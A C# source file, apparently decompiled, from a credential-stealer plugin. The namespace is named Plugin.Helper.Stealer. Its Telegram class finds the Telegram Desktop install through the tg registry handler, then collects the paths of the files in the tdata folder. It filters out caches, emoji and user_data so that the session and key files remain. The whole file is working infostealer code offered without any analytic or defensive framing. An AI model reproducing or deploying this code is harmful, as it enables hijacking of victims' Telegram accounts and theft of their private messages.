

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using InvokedCommon.Structs;
using Microsoft.Win32;


namespace Plugin.Helper.Stealer
{
	public static class Telegram
	{
		public static TelegramInfo? GetInfo()
		{
			object obj = Utils.ReadRegistryKeyValue(RegistryHive.ClassesRoot, "tg\\DefaultIcon", "");
			if (obj == null || obj.GetType() != typeof (string))
				return new TelegramInfo?();
			string str1 = ((string) obj).Replace("\"", "");
			if (!str1.Contains(",") || str1.IndexOf(",") == 0)
				return new TelegramInfo?();
			string str2 = Path.Combine(Path.GetDirectoryName(str1.Split(',')[0]), "tdata");
			string[] strArray = new string[12]
			{
				"_*.config",
				"dumps",
				"tdummy",
				"emoji",
				"user_data",
				"user_data#2",
				"user_data#3",
				"user_data#4",
				"user_data#5",
				"user_data#6",
				"*.json",
				"webview"
			};
			string[] excludePatterns = new string[8]
			{
				"_.*\\.config",
				"dumps",
				"tdummy",
				"emoji",
				"user_data",
				"user_data#\\d+",
				".*\\.json",
				"webview"
			};
			string[] array;
			try
			{
				array = ((IEnumerable<FileInfo>) new DirectoryInfo(str2).GetFiles("*", SearchOption.AllDirectories)).Where<FileInfo>((Func<FileInfo, bool>) (f => !Telegram.IsExcluded(f.FullName, excludePatterns))).Select<FileInfo, string>((Func<FileInfo, string>) (fileInfo => fileInfo.FullName)).ToArray<string>();
			}
			catch
			{
				return new TelegramInfo?();
			}
			return new TelegramInfo?(new TelegramInfo(str2, array));
		}

		private static bool IsExcluded(string filePath, string[] patterns)
		{
			foreach (string pattern in patterns)
			{
				if (Regex.IsMatch(filePath, pattern))
					return true;
			}
			return false;
		}
	}
}
